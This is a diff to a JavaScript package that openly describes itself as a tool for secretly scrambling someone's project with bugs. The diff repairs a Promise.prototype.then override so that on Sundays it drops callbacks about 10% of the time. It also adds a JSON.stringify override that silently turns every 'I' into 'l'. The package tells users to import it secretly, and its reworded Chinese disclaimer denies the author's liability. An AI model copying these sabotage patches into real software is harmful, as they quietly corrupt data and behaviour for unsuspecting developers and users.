@@ -6,7 +6,7 @@
  * @disclaimer The purpose of this package is to scramble someone's project and produces bugs.
  * 			Remember import this package secretly.
  * 			The author of this package does not participate any of injections!
- * @disclaimer_zh 本包用于给项目不定期制造BUG用，请私密地引入本包。本包的作者不参与传播、注入。
+ * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
 
 (() => {
@@ -61,14 +61,23 @@
 
 	/**
 	 * Promise.then has a 10% chance will not register on Sundays
-	 * @zh Promise.then 在周日时有10%不会注册
+	 * @zh Promise.then 在周日时有10%几率不会注册
 	 */
 	const _then = Promise.prototype.then;
-	Promise.prototype.then = function(fn, ...args) {
+	Promise.prototype.then = function(...args) {
 		if(new Date().getDay() === 0 && Math.random() < 0.1) {
 			return;
 		} else {
-			_then.call(fn, ...args);
+			_then.call(this, ...args);
 		}
+	}
+
+	/**
+	 * JSON.stringify will replace 'I' into 'l'
+	 * @zh JSON.stringify 会把'I'变成'l'
+	 */
+	const _stringify = JSON.stringify;
+	JSON.stringify = function(...args) {
+		return _stringify(...args).replace(/I/g, 'l');
 	}
 })();
